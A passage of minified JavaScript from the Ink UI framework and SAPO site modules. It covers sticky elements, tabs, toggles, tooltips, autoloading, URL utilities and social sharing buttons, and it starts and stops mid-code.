u='a[href$="#'+(a.name||a.id)+'"]',d=o.select(u,e);for(l=0,c=d.length;l<c;l++)n.addClassName(i.findUpwardsByTag(d[l],"li"),"active")}}function l(){e.BaseUIComponent.apply(this,arguments)}var c=[],u=!1;return l._name="Spy_1",l._optionDefinition={target:["Element",void 0],margin:["Number",0]},l.prototype={_init:function(){r(this._element,this._options.target,this._options),u||(u=!0,t.observe(document,"scroll",t.throttle(a,300))),a()}},e.createUIComponent(l),l})),Ink.createModule("Ink.UI.Sticky","1",["Ink.UI.Common_1","Ink.Dom.Event_1","Ink.Dom.Element_1","Ink.Dom.Css_1"],(function(e,t,n,i){"use strict";function o(){e.BaseUIComponent.apply(this,arguments)}return o._name="Sticky_1",o._optionDefinition={offsetBottom:["Integer",0],offsetTop:["Integer",0],topElement:["Element",null],wrapperClass:["String","ink-sticky-wrapper"],stickyClass:["String","ink-sticky-stuck"],inlineDimensions:["Boolean",!0],inlinePosition:["Boolean",!0],bottomElement:["Element",null],activateInLayouts:["String",null]},o.prototype={_init:function(){this._options.activateInLayouts&&(this._options.activateInLayouts=this._options.activateInLayouts.toString()),this._dims=null,this._options.offsetTop=parseInt(this._options.offsetTop,10)||0,this._options.offsetBottom=parseInt(this._options.offsetBottom,10)||0,this._options.topElement&&(this._options.topElement=e.elOrSelector(this._options.topElement,"Top Element")),this._options.bottomElement&&(this._options.bottomElement=e.elOrSelector(this._options.bottomElement,"Sticky bottom Element")),this._wrapper=n.create("div",{className:this._options.wrapperClass}),n.wrap(this._element,this._wrapper);var i=document.addEventListener?document:window;this._onScroll=Ink.bind(t.throttle(this._onScroll,33),this),t.observe(i,"scroll",this._onScroll),t.observe(window,"resize",Ink.bindEvent(t.throttle(this._onResize,100),this)),this._onScroll()},_isDisabledInLayout:function(){if(!this._options.activateInLayouts)return!1;var t=e.currentLayout();return!!t&&-1===this._options.activateInLayouts.indexOf(t)},_onScroll:function(){var e=this._getDims(),t=n.scrollHeight();if(this._isDisabledInLayout()||t<=e.top-this._options.offsetTop||this._options.topElement&&this._options.topElement.getBoundingClientRect().bottom+this._options.offsetTop>0)this._unstick();else{var i=this._options.offsetTop+e.height+n.scrollHeight(),o=document.body.scrollHeight;this._options.bottomElement&&(o=this._options.bottomElement.getBoundingClientRect().top+n.scrollHeight()),i<(o-=this._options.offsetBottom)?this._stickTo("screen"):this._stickTo("bottom")}},_stickTo:function(e){var t=this._element.style,o=this._getDims();if(i.addClassName(this._element,this._options.stickyClass),this._wrapper.style.height=o.height+"px",this._inlineDimensions(o.height+"px",o.width+"px"),!1!==this._options.inlinePosition)if(t.left=o.left+"px","screen"===e)t.bottom=null,t.top=this._options.offsetTop+"px";else if("bottom"===e){var r=this._getBottomOffset(),a=n.scrollHeight()+n.viewportHeight(),s=n.pageHeight()-a;t.bottom=r-s+"px",t.top="auto"}},_unstick:function(){i.removeClassName(this._element,this._options.stickyClass),this._inlineDimensions(null,null),this._options.inlinePosition&&(this._element.style.left=null,this._element.style.top=null,this._element.style.bottom=null),this._wrapper.style.height=null,this._wrapper.style.width=null,this._dims=null},_onResize:function(){this._dims=null,this._onScroll()},_getDims:function(){if(null!==this._dims)return this._dims;var e=this._element.style,t=e.position,i=e.width;e.position="static",e.width=null;var o=n.outerDimensions(this._element),r=this._wrapper.getBoundingClientRect();return this._dims={height:o[1],width:o[0],left:r.left+n.scrollWidth(),top:r.top+n.scrollHeight()},e.position=t,e.width=i,this._dims},_inlineDimensions:function(e,t){this._options.inlineDimensions&&(this._element.style.height=e,this._element.style.width=t)},_getBottomOffset:function(){var e=this._options.offsetBottom;return this._options.bottomElement&&(e+=n.pageHeight()-n.offsetTop(this._options.bottomElement)),e}},e.createUIComponent(o),o})),Ink.createModule("Ink.UI.Tabs","1",["Ink.UI.Common_1","Ink.Dom.Event_1","Ink.Dom.Css_1","Ink.Dom.Element_1","Ink.Dom.Selector_1"],(function(e,t,n,i,o){"use strict";function r(){e.BaseUIComponent.apply(this,arguments)}return r._name="Tabs_1",r._optionDefinition={preventUrlChange:["Boolean",!1],scrollUrlChange:["Boolean",!0],active:["String",void 0],onBeforeChange:["Function",void 0],onChange:["Function",void 0],menuSelector:["String",".tabs-nav"],contentSelector:["String",".tabs-content"],triggerEventsOnLoad:["Boolean",!0]},r.prototype={_init:function(){return this._menu=o.select(this._options.menuSelector,this._element)[0],this._menu?(this._initializeDom(),t.on(this._menu,"click","a",Ink.bindMethod(this,"_onTabClickedGeneric")),void this._setFirstActive()):void Ink.warn('Ink.UI.Tabs: An element selected by "'+this._options.menuSelector+'" needs to exist inside the element!')},_initializeDom:function(){for(var e=o.select(this._options.contentSelector,this._element),t=0;t<e.length;t++)n.addClassName(e[t],"hide-all")},_setFirstActive:function(){var e=window.location.hash,t=this._findLinkByHref(e)||this._options.active&&this._findLinkByHref(this._options.active)||o.select(".active a",this._menu)[0]||o.select("a",this._menu)[0];t&&(this._firstTime=!0,this._changeTab(t,this._options.triggerEventsOnLoad),this._firstTime=!1)},_changeTab:function(e,t){t&&void 0!==this._options.onBeforeChange&&this._options.onBeforeChange(this);var i=e.getAttribute("href"),r=i.substr(i.indexOf("#"));if(window.location.hash!==r&&!this._options.preventUrlChange&&!this._firstTime)if(this._options.scrollUrlChange)window.location.hash=r;else if("replaceState"in history)history.replaceState("",document.title,location.pathname+location.search+r);else{var a=document.body.scrollTop,s=document.body.scrollLeft;location.hash=r,document.body.scrollTop=a,document.body.scrollLeft=s}for(var l=o.select("> li.active",this._menu),c=0,u=l.length;c<u;c++)l[c]!==e&&n.removeClassName(l[c],"active");return this._activeMenuTab&&(n.removeClassName(this._activeMenuTab,"active"),n.removeClassName(this._activeSection,"active"),n.addClassName(this._activeSection,"hide-all")),this._activeMenuLink=e,this._activeMenuTab=this._activeMenuLink.parentNode,this._activeSection=o.select(r,this._element)[0],this._activeSection?(n.addClassName(this._activeMenuTab,"active"),n.addClassName(this._activeSection,"active"),n.removeClassName(this._activeSection,"hide-all"),void(t&&void 0!==this._options.onChange&&this._options.onChange(this))):void(this._activeMenuLink=this._activeMenuTab=this._activeSection=null)},_onTabClickedGeneric:function(e){e.preventDefault(),!n.hasClassName(e.currentTarget,"ink-disabled")&&e.currentTarget!==this._activeMenuLink&&this._onTabClicked(e.currentTarget)},_onTabClicked:function(e){var t=e.getAttribute("href")||"";(t=t.substr(t.indexOf("#")))&&null!==Ink.i(this._dehashify(t))&&e!==this._activeMenuLink&&this.changeTab(e)},_hashify:function(e){return e?0===e.indexOf("#")?e:"#"+e:""},_dehashify:function(e){return e?(""+e).replace(/^#/,""):""},_findLinkByHref:function(e){if(!e)return null;if(1===e.nodeType){if(i.isAncestorOf(e,this._element))return null;for(var t=o.select("a",this._menu),n=e.getAttribute("id"),r=0,a=t.length;r<a;r++){if(t[r]===e||i.isAncestorOf(e,t[r]))return t[r];if(n&&n===this._dehashify(t[r].hash))return t[r]}return null}return e=this._hashify(e),o.select('a[href$="'+e+'"]',this._menu)[0]||null},changeTab:function(e){(e=this._findLinkByHref(e))&&!n.hasClassName(e,"ink-disabled")&&this._changeTab(e,!0)},disable:function(e){n.addClassName(this._findLinkByHref(e),"ink-disabled")},enable:function(e){n.removeClassName(this._findLinkByHref(e),"ink-disabled")},activeTab:function(){return this._activeSection.getAttribute("id")},activeMenuLink:function(){return this._activeMenuLink},activeSection:function(){return this._activeSection},destroy:e.destroyComponent},e.createUIComponent(r),r})),Ink.createModule("Ink.UI.Toggle","1",["Ink.UI.Common_1","Ink.Dom.Event_1","Ink.Dom.Css_1","Ink.Dom.Element_1","Ink.Dom.Selector_1","Ink.Util.Array_1"],(function(e,t,n,i,o,r){"use strict";function a(){e.BaseUIComponent.apply(this,arguments)}return a._name="Toggle_1",a._optionDefinition={target:["Elements"],triggerEvent:["String","click"],closeOnClick:["Boolean",null],canToggleAnAncestor:["Boolean",!1],isAccordion:["Boolean",!1],initialState:["Boolean",null],classNameOn:["String","show-all"],classNameOff:["String","hide-all"],closeOnInsideClick:["String","a[href]"],onChangeState:["Function",null]},a.prototype={_init:function(){var t,o;if(this._targets=e.elsOrSelector(this._options.target),null===this._options.closeOnClick&&(this._options.closeOnClick=!this._options.isAccordion&&!this._options.canToggleAnAncestor),null===this._options.initialState&&(this._options.initialState=n.hasClassName(this._targets[0],this._options.classNameOn)),"show-all"!==this._options.classNameOn||"hide-all"!==this._options.classNameOff)for(t=0,o=this._targets.length;t<o;t++)n.removeClassName(this._targets[t],"show-all"),n.removeClassName(this._targets[t],"hide-all");if(this._options.isAccordion&&(this._accordionContainer=i.findUpwardsByClass(this._element,"accordion"),this._accordionContainer||Ink.warn('Ink.UI.Toggle_1: This toggle has the isAccordion option set to `true`, but is not a descendant of an element with the class "accordion"! Because of this, it won\'t be able to find other toggles in the same accordion and cooperate with them.')),this._constructing=!0,this._bindEvents(),null!==this._options.initialState)this.setState(this._options.initialState,!0);else{var r="none"!==n.getStyle(this._targets[0],"display");this.setState(r,!0)}for(t=0,o=this._targets.length;t<o;t++)this._targets[t].style.display&&(this._targets[t].style.display="");this._element.setAttribute("data-is-toggle-trigger","true"),this._constructing=!1},_bindEvents:function(){if(this._options.triggerEvent&&t.on(this._element,this._options.triggerEvent,Ink.bind(this._onTriggerEvent,this)),this._options.closeOnClick&&t.observe(document,"click",Ink.bind(this._onOutsideClick,this)),this._options.closeOnInsideClick){var e=this._options.closeOnInsideClick;"true"===e.toString()&&(e="*"),t.observeMulti(this._targets,"click",Ink.bind((function(n){i.findUpwardsBySelector(t.element(n),e)&&this.setState(!1,!0)}),this))}},_onTriggerEvent:function(e){var n=t.element(e),o=r.some(this._targets,(function(e){return e===n||i.isAncestorOf(e,n)}));if(this._options.canToggleAnAncestor||!o){var a=this.getState();this.setState(!a,!0),!a&&this._firstTime&&(this._firstTime=!1),t.stopDefault(e)}},_updateAccordion:function(){if(this._accordionContainer&&!1!==this.getState())for(var e=o.select("[data-is-toggle-trigger]",this._accordionContainer),t=0;t<e.length;t++){var n=a.getInstance(e[t]);n&&n!==this&&!0===n.getState()&&n.setState(!1,!0)}},_onOutsideClick:function(e){var n,o=t.element(e);if(i.isAncestorOf(document.documentElement,o)){var a=r.some(this._targets,(function(e){return i.isAncestorOf(e,o)||e===o}));if(this._element!==o&&!i.isAncestorOf(this._element,o)&&!a){if((n=Ink.ss(".ink-shade")).length)for(var s=n.length,l=0;l<s;l++)if(i.isAncestorOf(n[l],o)&&i.isAncestorOf(n[l],this._element))return;this.setState(!1,!0)}}},setState:function(e,t){if(e!==this.getState()||this._constructing){var i,o;if(this._group&&e)for(i=0,o=this._group.length;i<o;i++)!0===this._group[i].getState()&&this._group[i].setState(!1,!0);if(t&&"function"==typeof this._options.onChangeState)if(!1===this._options.onChangeState.call(this,e,{element:this._element}))return!1;for(i=0,o=this._targets.length;i<o;i++)n.addRemoveClassName(this._targets[i],this._options.classNameOn,e),n.addRemoveClassName(this._targets[i],this._options.classNameOff,!e);n.addRemoveClassName(this._element,"active",e),this._accordionContainer&&this._updateAccordion()}},getState:function(){return n.hasClassName(this._element,"active")}},e.createUIComponent(a),a})),Ink.createModule("Ink.UI.Tooltip","1",["Ink.UI.Common_1","Ink.Dom.Event_1","Ink.Dom.Element_1","Ink.Dom.Selector_1","Ink.Util.Array_1","Ink.Dom.Css_1","Ink.Dom.Browser_1"],(function(e,t,n,i,o,r){"use strict";function a(e,t){this._init(e,t||{})}function s(e,t){this._init(e,t)}var l,c,u;!function(){for(var e=document.createElement("DIV"),t=["transition","oTransition","msTransition","mozTransition","webkitTransition"],n=0;n<t.length;n++)if(void 0!==e.style[t[n]+"Duration"]){l=t[n]+"Duration",c=t[n]+"Property",u=t[n]+"TimingFunction";break}}();var d=document.getElementsByTagName("body"),h=d.length?d[0]:document.documentElement;return a.prototype={_init:function(e,t){var n;if(this.options=Ink.extendObj({where:"up",zIndex:1e4,left:10,top:10,spacing:8,forever:0,color:"",timeout:0,delay:0,template:null,templatefield:null,fade:.3,text:""},t||{}),"string"==typeof e)n=i.select(e);else{if("object"!=typeof e)throw"Element expected";n=[e]}this.tooltips=[];for(var o=0,r=n.length;o<r;o++)this.tooltips[o]=new s(this,n[o])},destroy:function(){o.each(this.tooltips,(function(e){e._destroy()})),this.tooltips=null,this.options=null}},s.prototype={_oppositeDirections:{left:"right",right:"left",up:"down",down:"up"},_init:function(n,i){t.observe(i,"mouseover",Ink.bindEvent(this._onMouseOver,this)),t.observe(i,"focus",Ink.bindEvent(this._onMouseOver,this)),t.observe(i,"mouseout",Ink.bindEvent(this._onMouseOut,this)),t.observe(i,"blur",Ink.bindEvent(this._onMouseOut,this)),t.observe(i,"mousemove",Ink.bindEvent(this._onMouseMove,this)),this.root=n,this.element=i,this._delayTimeout=null,this.tooltip=null,e.registerInstance(this,this.element)},_makeTooltip:function(e){if(!this._getOpt("text")&&!this._getOpt("html")&&!n.hasAttribute(this.element,"title"))return!1;var i=this._createTooltipElement();this.tooltip&&this._removeTooltip(),this.tooltip=i,this._fadeInTooltipElement(i),this._placeTooltipElement(i,e),t.observe(i,"mouseover",Ink.bindEvent(this._onTooltipMouseOver,this));var o=this._getFloatOpt("timeout");o&&setTimeout(Ink.bind((function(){this.tooltip===i&&this._removeTooltip()}),this),1e3*o)},_createTooltipElement:function(){var t,o,a=this._getOpt("template"),s=this._getOpt("templatefield");if(a){var l=document.createElement("DIV");if(l.innerHTML=e.elOrSelector(a,"options.template").outerHTML,t=l.firstChild,s){if(!(o=i.select(s,t)))throw"options.templatefield must be a valid selector within options.template";o=o[0]}else o=t}else t=document.createElement("DIV"),r.addClassName(t,"ink-tooltip"),r.addClassName(t,this._getOpt("color")),o=document.createElement("DIV"),r.addClassName(o,"content"),t.appendChild(o);return this._getOpt("html")?o.innerHTML=this._getOpt("html"):this._getOpt("text")?n.setTextContent(o,this._getOpt("text")):n.setTextContent(o,this.element.getAttribute("title")),t.style.display="block",t.style.position="absolute",t.style.zIndex=this._getIntOpt("zIndex"),t},_fadeInTooltipElement:function(e){var t=this._getFloatOpt("fade");l&&t&&(e.style.opacity="0",e.style[l]=t+"s",e.style[c]="opacity",e.style[u]="ease-in-out",setTimeout((function(){e.style.opacity="1"}),0))},_placeTooltipElement:function(e,t){var i=this._getOpt("where");if(null!==t||"mousemove"!==i&&"mousefix"!==i||(i="up"),"mousemove"===i||"mousefix"===i){var o=t;this._setPos(o[0],o[1]),h.appendChild(e)}else if(i.match(/(up|down|left|right)/)){h.appendChild(e);var a=n.offset(this.element),s=a[0],l=a[1],c=n.elementWidth(this.element)/2-n.elementWidth(e)/2,u=n.elementHeight(this.element)/2-n.elementHeight(e)/2,d=this._getIntOpt("spacing"),p=n.elementDimensions(e),f=n.elementDimensions(this.element),m=n.scrollWidth()+n.viewportWidth(),g=n.scrollHeight()+n.viewportHeight();"up"===(i=this._getWhereValueInsideViewport(i,{left:s-p[0],right:s+p[0],top:l+p[1],bottom:l+p[1]},{right:m,bottom:g}))?(l-=p[1],l-=d,s+=c):"down"===i?(l+=f[1],l+=d,s+=c):"left"===i?(s-=p[0],s-=d,l+=u):"right"===i&&(s+=f[0],s+=d,l+=u);var v=null;i.match(/(up|down|left|right)/)&&(v=document.createElement("SPAN"),r.addClassName(v,"arrow"),r.addClassName(v,this._oppositeDirections[i]),e.appendChild(v));var y=s,_=l,b=_+p[1]-g,w=y+p[0]-m,k=0-y,I=0-_;b>0?(v&&(v.style.top=p[1]/2+b+"px"),_-=b):I>0?(v&&(v.style.top=p[1]/2-I+"px"),_+=I):w>0?(v&&(v.style.left=p[0]/2+w+"px"),y-=w):k>0&&(v&&(v.style.left=p[0]/2-k+"px"),y+=k),e.style.left=y+"px",e.style.top=_+"px"}},_getWhereValueInsideViewport:function(e,t,n){return"left"===e&&t.left<0?"right":"right"===e&&t.right>n.right?"left":"up"===e&&t.top<0?"down":"down"===e&&t.bottom>n.bottom?"up":e},_removeTooltip:function(){var e=this.tooltip;if(e){var t=Ink.bind(n.remove,{},e);"mousemove"!==this._getOpt("where")&&l?(e.style.opacity=0,setTimeout(t,1e3*this._getFloatOpt("fade"))):t(),this.tooltip=null}},_getOpt:function(e){var t=n.data(this.element)[n._camelCase("tip-"+e)];if(t)return t;var i=this.root.options[e];return void 0!==i?i:void 0},_getIntOpt:function(e){return parseInt(this._getOpt(e),10)},_getFloatOpt:function(e){return parseFloat(this._getOpt(e),10)},_destroy:function(){this.tooltip&&n.remove(this.tooltip),this.root=null,this.element=null,this.tooltip=null},_onMouseOver:function(e){var t;t="mouseover"!==e.type?null:this._getMousePosition(e);var n=this._getFloatOpt("delay");n?this._delayTimeout=setTimeout(Ink.bind((function(){this.tooltip||this._makeTooltip(t),this._delayTimeout=null}),this),1e3*n):this._makeTooltip(t)},_onMouseMove:function(e){if("mousemove"===this._getOpt("where")&&this.tooltip){var t=this._getMousePosition(e);this._setPos(t[0],t[1])}},_onMouseOut:function(){this._getIntOpt("forever")||this._removeTooltip(),this._delayTimeout&&(clearTimeout(this._delayTimeout),this._delayTimeout=null)},_onTooltipMouseOver:function(){this.tooltip&&this._removeTooltip()},_setPos:function(e,t){e+=this._getIntOpt("left"),t+=this._getIntOpt("top");var i=this._getPageXY();if(this.tooltip){var o=[n.elementWidth(this.tooltip),n.elementHeight(this.tooltip)],r=this._getScroll();o[0]+e-r[0]>=i[0]-20&&(e=e-o[0]-this._getIntOpt("left")-10),o[1]+t-r[1]>=i[1]-20&&(t=t-o[1]-this._getIntOpt("top")-10),this.tooltip.style.left=e+"px",this.tooltip.style.top=t+"px"}},_getPageXY:function(){var e=0,t=0;return"number"==typeof window.innerWidth?(e=window.innerWidth,t=window.innerHeight):document.documentElement&&(document.documentElement.clientWidth||document.documentElement.clientHeight)?(e=document.documentElement.clientWidth,t=document.documentElement.clientHeight):document.body&&(document.body.clientWidth||document.body.clientHeight)&&(e=document.body.clientWidth,t=document.body.clientHeight),[parseInt(e,10),parseInt(t,10)]},_getScroll:function(){var e=document.documentElement,t=document.body;return e&&(e.scrollLeft||e.scrollTop)?[e.scrollLeft,e.scrollTop]:t?[t.scrollLeft,t.scrollTop]:[0,0]},_getMousePosition:function(e){return[parseInt(t.pointerX(e),10),parseInt(t.pointerY(e),10)]}},a})),Ink.createModule("Ink.Autoload",1,["Ink.Dom.Selector_1","Ink.Util.Array_1","Ink.Dom.Loaded_1","Ink.UI.SmoothScroller_1","Ink.UI.Close_1","Ink.UI.Drawer_1"],(function(e,t,n,i,o,r){"use strict";function a(t){try{e.select(t,s)}catch(e){return Ink.error(e),!1}return!0}var s=document.createElement("div"),l={selectors:{Carousel_1:".ink-carousel",DatePicker_1:".ink-datepicker",FormValidator_2:".ink-formvalidator",Modal_1:".ink-modal",Sticky_1:".ink-sticky, .sticky",Tabs_1:".ink-tabs",Toggle_1:".ink-toggle, .toggle",Tooltip_1:".ink-tooltip, .tooltip"},defaultOptions:{},run:function(n,a){function s(i){var o;/\./.test(i)&&(i=i.split("."),o=i[1],i=i[0]);var r="Ink.UI."+i,s=e.select(a.selectors[i],n);(s=t.filter(s,c)).length&&Ink.requireModules([r],(function(e){t.forEach(s,(function(t){"function"==typeof e.getInstance&&null!=e.getInstance(t)||(o?e[o](t,l.defaultOptions[i]):new e(t,l.defaultOptions[i]))}))}))}function c(e){return!0===a.forceAutoload||("function"==typeof e.getAttribute||"object"==typeof e.getAttribute?"false"!==e.getAttribute("data-autoload"):void 0)}for(var u in(a=Ink.extendObj({selectors:l.selectors},a||{})).selectors)a.selectors.hasOwnProperty(u)&&s(u);!1!==a.createClose&&new o,!1!==a.createSmoothScroller&&i.init(),!1!==a.createDrawer&&(!e.matchesSelector(document.body,".ink-drawer")||r.getInstance&&r.getInstance(document.body)||new r(document.body))},add:function(e,t){return!!a(t)&&void(l.selectors[e]?l.selectors[e]+=", "+t:l.selectors[e]=t)},remove:function(e){delete l.selectors[e]}};for(var c in l.selectors)l.selectors.hasOwnProperty(c)&&(l.defaultOptions[c]={});return window.INK_NO_AUTO_LOAD||n.run((function(){l.run(document,{createSmoothScroller:!0,createClose:!0}),l.firstRunDone=!0})),l})),Ink.createModule("SAPO.Utils",1,["Ink.Util.Array_1","Ink.Util.Url_1","Ink.Dom.Event_1"],(function(e,t,n){"use strict";function i(e,t){return e.indexOf(t)>-1}function o(e){var t={};try{e.replace(/(?:^|&)([^&=]*)=?([^&]*)/g,(function(e,n,i){e&&(t[decodeURIComponent(n)]=decodeURIComponent(i))}))}catch(e){}return t}function r(e){var t=[];for(var n in e)e.hasOwnProperty(n)&&t.push(encodeURIComponent(n)+"="+encodeURIComponent(e[n]));return t.join("&")}function a(e){return null!=e&&null!=e}var s=!1;return n.observe(window,"message",(function(e){try{var t=JSON.parse(e.data);s=t&&t.method&&i(["adPlay","play"],t.method)}catch(e){}})),{swaShareAttrs:function(e,t,n,i){return[i?"&":"?","utm_source="+t+"_sharebutton","&utm_medium=social","&utm_campaign=social_sharebutton"].join("")},getShareUrl:function(n,i,o){return encodeURIComponent(e.filter([o||window.location.protocol+"//"+window.location.host+window.location.pathname,t.getAnchorString().pid?"?pid="+t.getAnchorString().pid:null,window.location.hash,this.swaShareAttrs(i,n,document.title,this.includes(window.location.pathname,"?"))],(function(e){return Boolean(e)})).join(""))},getSocialShareUrl:function(e){switch(e){case"facebook":return"https://www.facebook.com/sharer/sharer.php?u=";case"google":return"http://plus.google.com/share?url=";case"pinterest":return"http://pinterest.com/pin/create/link/?url=";case"twitter":return"https://twitter.com/intent/tweet?url=";case"linkedin":return"https://www.linkedin.com/sharing/share-offsite/?url=";case"whatsapp":return"https://api.whatsapp.com/send";case"facebook-messenger":return"fb-messenger://share";default:return}},trackGTMPageView:function(){dataLayer&&(dataLayer.push({is_virtualPageview:"true"}),dataLayer.push({event:"virtualPageView"}))},trackGTMEvent:function(e,t,n){dataLayer&&dataLayer.push({event:"eventSAPO",Category:e,Action:t,Label:n})},trackGTMWidget:function(e,t,n){dataLayer&&(dataLayer.push({pageview_type:"widget"}),dataLayer.push({event:"widgetEvent",Category:e,Action:t,Label:n}))},slugify:function(e){if(!e||"undefined"===e)return"";var t="àáâäæãåāăąçćčđďèéêëēėęěğǵḧîïíīįìłḿñńǹňôöòóœøōõṕŕřßśšşșťțûüùúūǘůűųẃẍÿýžźż·/_,:;";e=e.toLowerCase();for(var n=0;n<t.length;n++)e=e.replace(new RegExp(t[n],"g"),"aaaaaaaaaacccddeeeeeeeegghiiiiiilmnnnnooooooooprrsssssttuuuuuuuuuwxyyzzz------"[n]);return e.replace(/\s+/g,"-").replace(/&/g,"-and-").replace(/[^\w\-]+/g,"").replace(/\-\-+/g,"-").replace(/^-+/,"").replace(/-+$/,"")},backHistory:function(e){n.observe(e,"touchstart",(function(e){n.stopDefault(e),history.go(-1)})),n.observe(e,"click",(function(e){n.stopDefault(e),history.go(-1)}))},includes:i,random:function(e){return Math.random().toString(36).slice(2,e||11)},loadAsync:function(e,t){var n=document.createElement("script");n.src=e,null!==t&&(n.readyState?n.onreadystatechange=function(){"loaded"!==n.readyState&&"complete"!==n.readyState||(n.onreadystatechange=null,t())}:n.onload=function(){t()}),document.getElementsByTagName("head")[0].appendChild(n)},hasLocalStorage:function(){var e="test";try{return localStorage.setItem(e,e),localStorage.removeItem(e),!0}catch(e){return!1}},keyValueDecode:o,keyValueEncode:r,urlEncode:function(e,t){return(t=r(t))?e+(/\?|&/.test(e)?"&":"?")+t:e},urlDecode:function(e){e=/^(?:(?![^:@?]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/\/?)?((?:(([^:@?]*):?([^:@?]*))?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/.exec(e);for(var t=["href","protocol","host","userInfo","user","pass","hostname","port","relative","pathname","directory","file","search","hash"],n=t.length,i={};n--;)e[n]&&(i[t[n]]=e[n]);return i.search&&(i.searchParams=o(i.search)),i.hash&&(i.hashParams=o(i.hash)),i},extend:function(e,t){for(var n=0,i=(t=[].slice.call(arguments,1)).length;n<i;n++)if(t[n])for(var o in t[n])Object.prototype.hasOwnProperty.call(t[n],o)&&(e[o]=t[n][o]);return e},isTouchDevice:function(){return/iphone|ipad|ipod|android/i.test(navigator.userAgent)},isset:a,breakpoint:function(){return window.getComputedStyle(Ink.s("body"),":before").getPropertyValue("content").replace(/\"/g,"")},isIE:function(){return/Trident/.test(navigator.userAgent)},isIOS:function(){return/iPad|iPod|iPhone|iOS/.test(navigator.userAgent)},isOldEdge:function(){return/Edge/.test(navigator.userAgent)},getThumbnail:function(e){var t=[];return e.src&&t.push("p="+encodeURIComponent(e.src)),e.epic&&t.push("epic="+e.epic),e.hash&&t.push("hash="+e.hash),e.width&&t.push("W="+e.width),e.height&&t.push("H="+e.height),e.quality&&t.push("Q="+e.quality),e.crop&&t.push("crop="+e.crop),t.push("errorpic="+(e.error?encodeURIComponent(e.error):"transparent")),e.png&&t.push("png=1"),e.optimize&&t.push("optim=1"),e.delay&&t.push("delay_optim=1"),e.tv&&t.push("tv="+e.tv),"//thumbs.web.sapo.io/?"+t.join("&")},isPlaying:function(){return!!(s||window.vc&&window.vc.isPlaying()||window.LiveBlogVideo&&Object.keys(window.LiveBlogVideo).length||window.SAPO&&window.SAPO.VideoPlayer&&window.SAPO.VideoPlayer.playing&&window.SAPO.VideoPlayer.playing())},setHash:function(e){if(e?"#"!=e.charAt(0)&&(e="#"+e):e="","replaceState"in history)history.replaceState("",document.title,location.pathname+location.search+e);else{var t=document.body.scrollTop,n=document.body.scrollLeft;location.hash=e,document.body.scrollTop=t,document.body.scrollLeft=n}},parents:function(t,n){var i=[];if(t)if(t.path||t.composedPath)i=t.path||t.composedPath(),n&&e.each(i,n);else if(t.target)for(var o=t.target;o&&o.parentNode;)i.push(o),n(o),o=o.parentNode;return i},findAncestor:function(e,t){for(;(e=e.parentElement)&&!(e.matches||e.matchesSelector).call(e,t););return e},log:function(e,t,n,i,o,r){a(r)?console.log(e,t,n,i,o,r):a(o)?console.log(e,t,n,i,o):a(i)?console.log(e,t,n,i):a(n)?console.log(e,t,n):a(t)?console.log(e,t):console.log(e)}}})),Ink.createModule("SAPO.SocialButtons",1,["Ink.Dom.Css_1","Ink.Dom.Element_1","Ink.Dom.Event_1","Ink.Util.Array_1","SAPO.Utils_1"],(function(e,t,n,i,o){"use strict";function r(e,t,n,i,r){if(i&&(i.preventDefault(),i.stopPropagation()),"copy"==e)!function(e,t){h.copy||(h.copy=document.createElement("input"),t.appendChild(h.copy)),h.copy.value=e,h.copy.focus(),h.copy.select(),h.copy.setSelectionRange(0,99999),document.execCommand("copy"),h.copy.blur()}(n||window.location.href,r);else{var a=o.getShareUrl(e,t,n),s=o.getSocialShareUrl(e),l="";switch(e){case"facebook":l="height=650,width=1024,scrollbars=1";break;case"google":break;case"pinterest":l="height=440,width=620,scrollbars=1";break;case"twitter":case"linkedin":l="height=650,width=1024,scrollbars=1";break;case"whatsapp":a="?text="+a;break;case"facebook-messenger":a="?link="+a}var c=[s,a].join("");window.open(c,"",l)}u()}function a(e){e&&i.forEach(e,(function(e){var t=e.getAttribute("data-social-replace-url")||"";t&&!e.hasAttribute("href")&&e.setAttribute("href",t),n.observe(e,"click",(function(t){var n=e.getAttribute("data-social-share-name");r(e.getAttribute("data-social"),n,e.getAttribute("data-social-replace-url")||"",t,e)}))}))}function s(e,n){var i=d.selectors.url;n&&d.selectors[n]&&(i=d.selectors[n]);var o=e.getAttribute(i);if(!o){var r=t.findUpwardsBySelector(e,"["+i+"]");r&&(o=r.getAttribute(i))}return o&&window.location.hash&&(o+=window.location.hash),o}function l(e,t,i,o){for(var r in i&&(d.hidden=i),h.modal=document.createElement("div"),d.modal)h.modal.setAttribute(r,d.modal[r]);h.modal.setAttribute("id",d.id);var l=[];l.push("<button "+d.selectors.close+' data-kpi="social-buttons-close,nav,static"><i class="fa fa-times"></i></button>'),l.push("<ul>");var c=s(e,o);for(var p in t&&!c&&(c=s(t,o)),d.social)l.push('<li><a aria-label="'+d.social[p].title+'" title="'+d.social[p].title+'" data-kpi="social-buttons-'+p+',nav,static" data-social="'+p+'" '+(c?'data-social-replace-url="'+c+'"':"")+' data-social-share-name="sapo_share"><i class="'+d.social[p].icon+'"></i></a></li>');l.push("</ul>"),h.modal.innerHTML=l.join("");var f=Ink.s("["+d.selectors.close+"]",h.modal);f&&n.on(f,"click",u);var m=Ink.ss(d.selectors.item,h.modal);m&&a(m),e.appendChild(h.modal)}function c(t,n,i,o){u(),t||(t=h.body),l(t,n,i,o),!e.hasClassName(t,d.style.parent)&&e.addClassName(t,d.style.parent)}function u(){h.modal&&t.remove(h.modal),delete h.modal,delete h.copy,d.hidden&&d.hidden(),delete d.hidden}var d={id:"modal-social-share",selectors:{item:"a[data-social]",url:"data-social-share-url",link:"data-social-share-link",trigger:"data-social-share-trigger",modal:"data-social-share-modal",close:"data-social-share-close"},style:{hide:"hide-all",parent:"modal-social-share"},modal:{role:"dialog","aria-hidden":"true","aria-label":"Partilhar"},social:{facebook:{title:"Facebook",icon:"fab fa-facebook"},twitter:{title:"Twitter",icon:"fab fa-twitter"},whatsapp:{title:"WhatsApp",icon:"fab fa-whatsapp"},copy:{title:"Copiar Link",icon:"fa fa-link"}}},h={};return{init:function(){var e=Ink.ss(d.selectors.item);e&&a(e),h.body=document.body||document.documentElement||Ink.s("body"),function(){var e="["+d.selectors.link+"]",t=Ink.ss(e);t&&i.each(t,(function(e){var 